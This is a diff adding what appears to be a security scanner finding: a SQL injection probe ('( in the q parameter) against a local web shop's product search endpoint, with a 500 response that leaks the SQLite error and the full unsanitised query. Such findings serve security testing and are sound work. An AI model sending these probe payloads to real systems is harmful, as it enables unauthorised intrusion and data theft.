@@ -1,0 +1,32 @@
+SQL injection may be possible.
+
+GET http://localhost:3000/rest/products/search?q=%27%28 HTTP/1.1
+host: localhost:3000
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0
+Accept: application/json, text/plain, */*
+Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
+Connection: keep-alive
+Referer: http://localhost:3000/
+
+HTTP/1.1 500 Internal Server Error
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Content-Type: application/json; charset=utf-8
+Vary: Accept-Encoding
+Date: Tue, 23 Sep 2025 08:34:56 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+content-length: 309
+
+{
+  "error": {
+    "message": "SQLITE_ERROR: near \"(\": syntax error",
+    "stack": "Error: SQLITE_ERROR: near \"(\": syntax error",
+    "errno": 1,
+    "code": "SQLITE_ERROR",
+    "sql": "SELECT * FROM Products WHERE ((name LIKE '%'(%' OR description LIKE '%'(%') AND deletedAt IS NULL) ORDER BY name"
+  }
+}
